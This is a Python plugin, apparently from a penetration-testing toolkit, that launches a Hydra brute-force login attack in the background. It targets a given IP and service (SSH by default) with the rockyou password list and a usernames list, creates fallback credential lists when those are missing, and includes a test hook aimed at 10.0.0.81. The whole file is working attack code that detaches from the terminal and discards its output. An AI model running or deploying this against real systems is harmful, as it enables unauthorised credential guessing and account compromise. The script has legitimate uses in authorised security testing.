# plugins/hydra_plugin.py
# to test if files exist:
# ls /usr/share/wordlists/rockyou.txt
# ls /usr/share/seclists/Usernames/top-usernames-shortlist.txt
# if not:
# sudo apt install seclists
# gzip -d /usr/share/wordlists/rockyou.txt.gz


import os
import time
import subprocess
from pathlib import Path

def run_hydra_attack(
    target_ip: str,
    service: str = "ssh",
    login_file: str = "/usr/share/wordlists/usernames.txt",
    pass_file: str = "/usr/share/wordlists/rockyou.txt",
    log_dir: str = "logs/hydra"
) -> dict:
    """
    Launches Hydra as a background brute-force attack.

    Args:
        target_ip (str): The IP address of the target system.
        service (str): The service to attack (default: "ssh").
        login_file (str): Path to a file with a list of usernames.
        pass_file (str): Path to a file with a list of passwords.
        log_dir (str): Directory to store the Hydra log file.

    Returns:
        dict: A structured result containing:
              - 'tool': Tool name
              - 'log': Path to log file (if successful)
              - 'target': IP address targeted
              - 'service': Service targeted
              - 'timestamp': When launched
              - 'cmd': Executed command
              - 'error': Optional error string (if failure occurred)
    """
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    timestamp = int(time.time())
    log_path = os.path.join(log_dir, f"hydra_{target_ip}_{timestamp}.log")

    # Auto-fallback: generate sample login/password files if missing
    try:
        if not os.path.exists(login_file):
            Path(login_file).parent.mkdir(parents=True, exist_ok=True)
            with open(login_file, "w") as f:
                f.write("root\nadmin\nuser\n")

        if not os.path.exists(pass_file):
            Path(pass_file).parent.mkdir(parents=True, exist_ok=True)
            with open(pass_file, "w") as f:
                f.write("password\n123456\nadmin\n")
    except Exception as file_err:
        return {
            "tool": "hydra",
            "target": target_ip,
            "service": service,
            "timestamp": timestamp,
            "cmd": None,
            "log": None,
            "error": f"File setup error: {file_err}"
        }

    cmd = [
        "nohup", "hydra",
        "-L", login_file,
        "-P", pass_file,
        target_ip, service,
        "-o", log_path
    ]

    try:
        subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setpgrp  # Run in new process group
        )

        print(f"[hydra_plugin] Hydra attack launched on {target_ip}:{service}, logging to {log_path}")

        return {
            "tool": "hydra",
            "log": log_path,
            "target": target_ip,
            "service": service,
            "timestamp": timestamp,
            "cmd": " ".join(cmd)
        }

    except Exception as e:
        print(f"[hydra_plugin] Failed to launch Hydra: {e}")
        return {
            "tool": "hydra",
            "log": None,
            "target": target_ip,
            "service": service,
            "timestamp": timestamp,
            "cmd": " ".join(cmd),
            "error": str(e)
        }

# Optional test hook
if __name__ == "__main__":
    run_hydra_attack("10.0.0.81")



